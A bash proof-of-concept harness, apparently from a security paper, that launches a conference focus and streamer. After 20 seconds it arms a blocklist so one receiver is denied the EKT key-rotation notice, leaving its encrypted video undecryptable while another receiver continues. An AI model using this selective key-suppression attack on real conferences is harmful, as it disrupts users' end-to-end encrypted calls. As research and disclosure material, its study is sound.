#!/usr/bin/env bash
# Diagnostic harness: paper §5.1 Phase 1 key-state divergence.
#
# Scenario:
#   T=0      sender (organizer), receiver A, receiver B join the conference. All receive K_initial.
#            The arm file is absent, so the blocklist is dormant; both receiver A and receiver B
#            receive EKT NOTIFY as usual.
#   T+0..20  Both receivers display video OK (baseline behavior).
#   T+20s    The streamer's trigger_rotation():
#             (1) touches the arm file → the focus's blocklist becomes active
#             (2) invites a dummy URI → the focus runs
#                 onAllowedParticipantListChanged → generates a new EKT → fans it
#                 out to all participants. However, with the armed blocklist,
#                 only the NOTIFY addressed to receiver A is dropped.
#   T+20+    receiver A stays on K_initial, receiver B rotates to K_new.
#            The sender starts SRTP encryption with K_new (Linphone's automatic SRTP switch).
#
# Expected observations:
#   focus log:
#     - T+0..20: no "PoC ATTACK suppressing" lines (arm file absent)
#     - From T+20s onward:
#         "Allowed participant list ... updated. Participants must regenerate EKT."
#         "EKT (just selected) sent to [receiver B]"  <- receiver B gets through
#         "*** PoC ATTACK *** suppressing ... [receiver A]"  <- only receiver A is dropped
#   receiver A (Android):
#     - T+0..20s: video displays OK
#     - From T+20s onward: video stops / breaks up
#   receiver B (iPhone):
#     - video displays OK for the entire period

set -euo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${POC_DIR}"
# shellcheck disable=SC1091
source "${POC_DIR}/scripts/common.sh"

ARM_FILE=/tmp/poc_blocklist_arm.flag

pkill -9 -f "streamer" 2>/dev/null || true
sleep 1
rm -f /tmp/focus.log /tmp/sender.log build/focus.uri "$ARM_FILE"

# shellcheck disable=SC1091
source build/envrc

# Start the focus with EKT_NOTIFY_BLOCKLIST="${SIP_RECV_A_USER}" + arm file gating.
# While the arm file is absent, the blocklist is inactive and EKT is distributed normally.
EKT_NOTIFY_BLOCKLIST="${SIP_RECV_A_USER}" \
EKT_NOTIFY_BLOCKLIST_ARM_FILE="$ARM_FILE" \
python -m streamer.focus \
    --sip-uri "${SIP_FOCUS_URI}" \
    --sip-password-file .sip-password-focus \
    --codec h264 \
    --log-level INFO > /tmp/focus.log 2>&1 &
disown

until grep -q "focus is ready" /tmp/focus.log 2>/dev/null; do sleep 1; done
echo "focus ready (blocklist=${SIP_RECV_A_USER}, arm_file=$ARM_FILE): $(cat build/focus.uri)"

# Start the streamer with rotate-after 20s + touch the arm file just before rotation
python -m streamer \
    --create --security-level e2ee \
    --codec h264 \
    --video-file src-video/video_02_anonymous.mp4 \
    --sip-uri "${SIP_SENDER_URI}" \
    --sip-password-file .sip-password \
    --conference-factory-uri-file build/focus.uri \
    --lime-server https://lime.linphone.org/lime-server/lime-server.php \
    --invite "${SIP_RECV_A_URI}" \
    --invite "${SIP_RECV_B_URI}" \
    --rotate-after 20 \
    --rotate-arm-file "$ARM_FILE" \
    --log-level INFO > /tmp/sender.log 2>&1 &
disown

cat <<EOF

=========================================================================
  Diagnostic — Phase 1 key-state divergence
=========================================================================

  Now answer the call on receiver A (Android) AND receiver B (iPhone). For the first
  ~20 seconds, both will see video normally (arm file is absent → blocklist
  is dormant).

  At T+20 s, the streamer:
    (1) touches the arm file ($ARM_FILE), activating the blocklist
    (2) sends a REFER to trigger key rotation on the focus

  Expected outcome:
    - receiver A (Android): video STOPS or breaks after T+20 s
                       (stuck on K_initial; sender now sends with K_new)
    - receiver B (iPhone):  video CONTINUES through the rotation

  Run for ~50 s total, then stop:
      pkill -9 -f streamer

  Inspect logs:
      grep 'PoC ATTACK\\|Allowed participant list\\|EKT (just selected) sent' /tmp/focus.log

=========================================================================
EOF
